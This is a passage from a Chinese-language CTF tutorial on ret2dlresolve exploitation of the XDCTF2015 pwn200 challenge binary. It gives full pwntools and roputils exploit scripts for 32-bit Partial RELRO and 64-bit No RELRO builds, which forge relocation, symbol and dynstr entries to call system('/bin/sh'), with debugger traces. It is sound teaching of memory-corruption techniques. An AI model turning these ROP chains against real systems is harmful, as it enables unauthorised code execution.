0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec1000 0xf7ec4000 rw-p     3000 0      
0xf7edf000 0xf7ee1000 rw-p     2000 0      
0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]
0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]
0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]
```

 而在動態解析符號地址的過程中，如果 version 爲 NULL 的話，也會正常解析符號。

與此同，根據上面的調試信息，可以知道 l_versions 的前兩個元素中的 hash 值都爲 0，因此如果我們使得 ndx 爲 0 或者 1 時，就可以滿足要求，我們來在 080487A8 下方找一個合適的值。可以發現 0x080487C2 處的內容爲0。

那自然的，我們就可以調用目標函數。

這裏，我們可以通過調整 base_stage 來達到相應的目的。

- 首先 0x080487C2 與 0x080487A8 之間差了 0x080487C2-0x080487A8)/2 個 version 記錄。
- 那麼，這也就說明原先的符號表偏移少了對應的個數。
- 因此，我們只需要將 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可達到對應的目的。

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

最終如下

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27967
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 5

這一階段，我們將在階段 4 的基礎上，進一步僞造 write 符號的 st_name 指向我們自己構造的字符串。

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('write\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

效果如下

```shell
❯ python stage5.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27994
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

事實上，這裏的 index_dynsym 又發生了變化，但似乎並不影響，因此我們也不用再想辦法僞造數據了。

##### stage 6

這一階段，我們只需要將原先的 write 字符串修改爲 system 字符串，同時修改 write 的參數爲 system 的參數即可獲取 shell。這是因爲 `_dl_runtime_resolve` 函數最終是依賴函數名來解析目標地址的。

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct ropchain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(base_stage + 82)
rop.raw('bbbb')
rop.raw('bbbb')
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('system\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh + '\x00')
rop.raw('a' * (100 - len(rop.chain())))
print rop.dump()
print len(rop.chain())
r.sendline(rop.chain())
r.interactive()
```

需要注意的是，這裏我把 /bin/sh 的偏移修改爲了 base_stage+82，這是因爲 pwntools 會對齊字符串。如下面的 ropchain 所示，0x40 處多了兩個 a，比較奇怪。

```
0x0038:           'syst' 'system\x00'
0x003c:        'em\x00o'
0x0040:             'aa'
0x0042:           'aaaa' 'aaaaaaaaaaaaaa'
```

效果如下

```shell
❯ python stage6.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 28204
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
0x0000:        0x8048370
0x0004:           0x25ec
0x0008:           'bbbb' 'bbbb'
0x000c:        0x804a94a
0x0010:           'bbbb' 'bbbb'
0x0014:           'bbbb' 'bbbb'
0x0018: '\x1c\xa0\x04\x08' '\x1c\xa0\x04\x08\x07u\x02\x00'
0x001c:  '\x07u\x02\x00'
0x0020:           'aaaa' 'aaaa'
0x0024:  '\xc0&\x00\x00' '\xc0&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
0x0028: '\x00\x00\x00\x00'
0x002c: '\x00\x00\x00\x00'
0x0030: '\x12\x00\x00\x00'
0x0034:           'syst' 'system\x00'
0x0038:        'em\x00n'
0x003c:             'aa'
0x003e:           'aaaa' 'aaaaaaaaaaaaaaaaaa'
0x0042:           'aaaa'
0x0046:           'aaaa'
0x004a:           'aaaa'
0x004e:           'aaaa'
0x0052:           '/bin' '/bin/sh\x00'
0x0056:        '/sh\x00'
0x005a:           'aaaa' 'aaaaaaaaaa'
0x005e:           'aaaa'
0x0062:           'aaaa'
102
[*] Switching to interactive mode
/bin/sh: 1: aa: not found
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

#### 基於工具僞造

根據上面的介紹，我們應該可以理解這個攻擊了。

##### Roputil

下面我們直接使用 roputil 來進行攻擊。代碼如下

```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./main')
context.log_level = 'debug'
r.recv()

rop = ROP('./main')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_runtimeresolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
```

關於 dl_resolve_call 與 dl_resolve_data 的具體細節請參考 roputils.py 的源碼，比較容易理解。需要注意的是，dl_resolve 執行完之後也是需要有對應的返回地址的。

效果如下

```shell
❯ python roptool.py
[+] Starting local process './main_partial_relro_32': pid 24673
[DEBUG] Received 0x17 bytes:
    'Welcome to XDCTF2015~!\n'
[DEBUG] Sent 0x94 bytes:
    00000000  42 6a 63 57  32 34 75 7a  30 64 6d 71  45 54 50 31  │BjcW│24uz│0dmq│ETP1│
    00000010  42 63 4b 61  4c 76 5a 35  38 77 79 6d  4c 62 34 74  │BcKa│LvZ5│8wym│Lb4t│
    00000020  56 47 4c 57  62 67 55 4b  65 57 4c 64  34 62 6f 47  │VGLW│bgUK│eWLd│4boG│
    00000030  43 47 59 65  4f 41 73 4c  61 35 79 4f  56 47 51 71  │CGYe│OAsL│a5yO│VGQq│
    00000040  59 53 47 69  6e 68 62 35  6f 33 4a 6e  31 77 66 68  │YSGi│nhb5│o3Jn│1wfh│
    00000050  45 6f 38 6b  61 46 46 38  4f 67 6c 62  61 41 58 47  │Eo8k│aFF8│Oglb│aAXG│
    00000060  66 7a 4b 30  63 6d 43 43  74 73 4d 7a  52 66 58 63  │fzK0│cmCC│tsMz│RfXc│
    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│
    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│
    00000090  40 a0 04 08                                         │@···│
    00000094
[DEBUG] Sent 0x64 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  35 45 4e 50  6e 51 51 4b  │/bin│/sh·│5ENP│nQQK│
    00000010  74 30 57 47  62 55 49 54  54 a0 04 08  07 e9 01 00  │t0WG│bUIT│T···│····│
    00000020  6c 30 39 79  68 4c 58 4b  00 1e 00 00  00 00 00 00  │l09y│hLXK│····│····│
    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 7a  │····│····│syst│em·z│
    00000040  32 45 74 78  75 35 59 6a  55 6b 54 74  63 46 70 71  │2Etx│u5Yj│UkTt│cFpq│
    00000050  32 42 6f 4c  43 53 49 33  75 47 59 53  7a 76 63 6b  │2BoL│CSI3│uGYS│zvck│
    00000060  44 43 4d 41                                         │DCMA│
    00000064
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x9f bytes:
    'exp-pwntools.py        roptool.py    stage2.py\tstage5.py\n'
    'ld-linux.so.2\t       roputils.pyc  stage3.py\tstage6.py\n'
    'main_partial_relro_32  stage1.py     stage4.py\n'
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

##### pwntools

這裏我們使用 pwntools 的工具進行攻擊。

```python
from pwn import *
context.binary = elf = ELF("./main_partial_relro_32")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
# pwntools will help us choose a proper addr
# https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
io = process("./main_partial_relro_32")
io.recvuntil("Welcome to XDCTF2015~!\n")
payload = flat({112:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()
```

結果如下

```shell
❯ python exp-pwntools.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[+] Starting local process './main_partial_relro_32': pid 24688
[*] Switching to interactive mode
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

### Full RELRO

在開啓 FULL RELRO 保護的情況下，程序中導入的函數地址會在程序開始執行之前被解析完畢，因此 got 表中 link_map 以及 dl_runtime_resolve 函數地址在程序執行的過程中不會被用到。故而，GOT 表中的這兩個地址均爲 0。此時，直接使用上面的技巧是不行的。

那有沒有什麼辦法可以繞過這樣的防護呢？請讀者自己思考。

## 64 位例子

### NO RELRO

在這種情況下，類似於 32 位的情況直接構造即可。由於可以溢出的緩衝區太少，所以我們可以考慮進行棧遷移後，然後進行漏洞利用。

1. 在 bss 段僞造棧。棧中的數據爲
    1. 修改 .dynamic 節中字符串表的地址爲僞造的地址
    2. 在僞造的地址處構造好字符串表，將 read 字符串替換爲 system 字符串。
    3. 在特定的位置讀取 /bin/sh 字符串。
    4. 調用 read 函數的 plt 的第二條指令，觸發 `_dl_runtime_resolve` 進行函數解析，從而觸發執行 system 函數。
2. 棧遷移到 bss 段。

由於程序中沒有直接設置 rdx 的 gadget，所以我們這裏就選擇了萬能 gadget。這會使得我們的 ROP 鏈變得更長

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
# gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())

# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

直接運行，發現不行，經過調試發現程序在 0x7f2512db3e69 處崩了。

```assembly
 RAX  0x600998 (_DYNAMIC+144) ◂— 0x6
 RBX  0x600d98 ◂— 0x6161616161616161 ('aaaaaaaa')
 RCX  0x7f2512ac3191 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x9
 RDI  0x600b30 (stdout@@GLIBC_2.2.5) ◂— 0x0
 RSI  0x3
 R8   0x50
 R9   0x7f2512faf4c0 ◂— 0x7f2512faf4c0
 R10  0x7f2512fcd170 ◂— 0x0
 R11  0x246
 R12  0x6161616161616161 ('aaaaaaaa')
 R13  0x6161616161616161 ('aaaaaaaa')
 R14  0x6161616161616161 ('aaaaaaaa')
 R15  0x6161616161616161 ('aaaaaaaa')
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x6009e0 (_DYNAMIC+216) —▸ 0x600ae8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 RIP  0x7f2512db3e69 (_dl_fixup+41) ◂— mov    rcx, qword ptr [r8 + 8]
──────[ DISASM ]────────
   0x7f2512db3e52 <_dl_fixup+18>    mov    rdi, qword ptr [rax + 8]
   0x7f2512db3e56 <_dl_fixup+22>    mov    rax, qword ptr [r10 + 0xf8]
   0x7f2512db3e5d <_dl_fixup+29>    mov    rax, qword ptr [rax + 8]
   0x7f2512db3e61 <_dl_fixup+33>    lea    r8, [rax + rdx*8]
   0x7f2512db3e65 <_dl_fixup+37>    mov    rax, qword ptr [r10 + 0x70]
 ► 0x7f2512db3e69 <_dl_fixup+41>    mov    rcx, qword ptr [r8 + 8] <0x7f2512ac3191>
```

經過逐步調試發現，在 `_dl_runtime_resolve` 會在棧中保存大量的數據

```assembly
.text:00000000000177A0 ; __unwind {
.text:00000000000177A0                 push    rbx
.text:00000000000177A1                 mov     rbx, rsp
.text:00000000000177A4                 and     rsp, 0FFFFFFFFFFFFFFC0h
.text:00000000000177A8                 sub     rsp, cs:qword_227808
.text:00000000000177AF                 mov     [rsp+8+var_8], rax
.text:00000000000177B3                 mov     [rsp+8], rcx
.text:00000000000177B8                 mov     [rsp+8+arg_0], rdx
.text:00000000000177BD                 mov     [rsp+8+arg_8], rsi
.text:00000000000177C2                 mov     [rsp+8+arg_10], rdi
.text:00000000000177C7                 mov     [rsp+8+arg_18], r8
.text:00000000000177CC                 mov     [rsp+8+arg_20], r9
.text:00000000000177D1                 mov     eax, 0EEh
.text:00000000000177D6                 xor     edx, edx
.text:00000000000177D8                 mov     [rsp+8+arg_240], rdx
.text:00000000000177E0                 mov     [rsp+8+arg_248], rdx
.text:00000000000177E8                 mov     [rsp+8+arg_250], rdx
.text:00000000000177F0                 mov     [rsp+8+arg_258], rdx
.text:00000000000177F8                 mov     [rsp+8+arg_260], rdx
.text:0000000000017800                 mov     [rsp+8+arg_268], rdx
.text:0000000000017808                 xsavec  [rsp+8+arg_30]
.text:000000000001780D                 mov     rsi, [rbx+10h]
.text:0000000000017811                 mov     rdi, [rbx+8]
.text:0000000000017815                 call    sub_FE40
```

其中 qword_227808 處的值爲0x0000000000000380。

```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> x/gx 0x7f2512da4000+0x227808
0x7f2512fcb808 <_rtld_global_ro+168>:	0x0000000000000380
```

當執行完下面的指令後

```assembly
 ► 0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
```

棧地址到了 0x600a00（我們是將棧遷移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 節中，後續在棧中保存數據時會破壞 .dynamic 節中的內容，最後導致了 dl_fixup 崩潰。

```
   0x7f2512dbb7a0 <_dl_runtime_resolve_xsavec>       push   rbx
   0x7f2512dbb7a1 <_dl_runtime_resolve_xsavec+1>     mov    rbx, rsp
   0x7f2512dbb7a4 <_dl_runtime_resolve_xsavec+4>     and    rsp, 0xffffffffffffffc0
   0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
 ► 0x7f2512dbb7af <_dl_runtime_resolve_xsavec+15>    mov    qword ptr [rsp], rax <0x600a00>
   0x7f2512dbb7b3 <_dl_runtime_resolve_xsavec+19>    mov    qword ptr [rsp + 8], rcx
   0x7f2512dbb7b8 <_dl_runtime_resolve_xsavec+24>    mov    qword ptr [rsp + 0x10], rdx
   0x7f2512dbb7bd <_dl_runtime_resolve_xsavec+29>    mov    qword ptr [rsp + 0x18], rsi
   0x7f2512dbb7c2 <_dl_runtime_resolve_xsavec+34>    mov    qword ptr [rsp + 0x20], rdi
   0x7f2512dbb7c7 <_dl_runtime_resolve_xsavec+39>    mov    qword ptr [rsp + 0x28], r8
─────────────────────[ STACK ]─────────────────
00:0000│ rsp  0x600a00 (_DYNAMIC+248) ◂— 0x7
01:0008│      0x600a08 (_DYNAMIC+256) ◂— 0x17
02:0010│      0x600a10 (_DYNAMIC+264) —▸ 0x400450 —▸ 0x600b00 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7f2512ac3250 (write) ◂— lea    rax, [rip + 0x2e06a1]
03:0018│      0x600a18 (_DYNAMIC+272) ◂— 0x7
04:0020│      0x600a20 (_DYNAMIC+280) —▸ 0x4003f0 —▸ 0x600ad8 —▸ 0x7f25129d4ab0 (__libc_start_main) ◂— push   r13
05:0028│      0x600a28 (_DYNAMIC+288) ◂— 0x8
06:0030│      0x600a30 (_DYNAMIC+296) ◂— 0x60 /* '`' */
07:0038│      0x600a38 (_DYNAMIC+304) ◂— 9 /* '\t' */
```

或許我們可以考慮把棧再遷移的高一些，但是，程序中與 bss 相關的映射只有 0x600000-0x601000，即一頁。與此同時

- bss 段的起始地址爲 0x600B30
- 僞造的棧的數據一共有 392 （0x188）

所以直接棧遷移到 bss節很容易出現問題。

```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

但經過精細的調節，我們還是避免破壞 .dynamic 節的內容

- 修改遷移後的棧的地址爲 bss_addr+0x200，即 0x600d30
- 修改遷移後的棧的大小爲 0x188

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x188 # new stack size is 0x188
new_stack = bss_addr+0x200

offset = 112+8
rop.raw(offset*'a')
